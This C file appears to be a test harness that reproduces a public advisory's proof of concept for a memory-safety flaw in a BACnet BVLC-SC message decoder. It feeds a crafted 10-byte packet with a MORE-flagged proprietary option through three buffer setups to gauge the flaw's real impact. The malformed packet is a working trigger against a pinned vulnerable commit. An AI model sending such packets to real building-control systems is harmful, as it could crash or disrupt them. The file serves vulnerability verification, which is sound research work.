/* Verify the REAL impact of the BVLC-SC trailing-MORE option-walk under three
   buffer conditions. argv[1] selects the case (each run is its own process so an
   abort in one does not hide the others).

   Source: GHSA-gr74-333w-7wg8 / CVE-2026-97692 public advisory PoC, reproduced
   verbatim against the real bvlc_sc_decode_message. Pinned vulnerable commit
   1068250f197c0cc78b6357374d8be5df7d94b3cc. */
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include "bacnet/bacdef.h"
#include "bacnet/datalink/bsc/bvlc-sc.h"

static const uint8_t MSG[10] = {0x02,0x02,0x00,0x00,0xBF,0x03,0x00,0x00,0x00,0x00};

static void decode(uint8_t *buf, size_t len){
    BVLC_SC_DECODED_MESSAGE dm; memset(&dm,0,sizeof dm);
    uint16_t ec=0,ecl=0; const char *d=NULL;
    int ok = bvlc_sc_decode_message(buf,len,&dm,&ec,&ecl,&d);
    printf("  decode returned %d (ec=%u ecl=%u desc=%s)\n", ok, ec, ecl, d?d:"(null)");
}

int main(int argc, char **argv){
    int c = argc>1 ? atoi(argv[1]) : 0;
    if (c==1){
        printf("[case1] EXACT-size 10-byte buffer (what the shipped PoC uses)\n");
        uint8_t *b = malloc(10); memcpy(b,MSG,10); decode(b,10); free(b);
    } else if (c==2){
        printf("[case2] PRODUCTION-like: 1500-byte RX buffer, msg_len=10, slack ZEROED\n");
        uint8_t *b = calloc(1,1500); memcpy(b,MSG,10); decode(b,10); free(b);
    } else if (c==3){
        printf("[case3] adversarial slack: 1500-byte buffer, msg_len=10, slack = 0xBF 0x03 00 00 00 00 (MORE-set proprietary options)\n");
        uint8_t *b = malloc(1500);
        memcpy(b,MSG,10);
        for(int i=10;i+5<1500;i+=6){ b[i]=0xBF; b[i+1]=0x03; b[i+2]=0; b[i+3]=0; b[i+4]=0; b[i+5]=0; }
        decode(b,10); free(b);
    }
    printf("  [survived, no abort]\n");
    return 0;
}
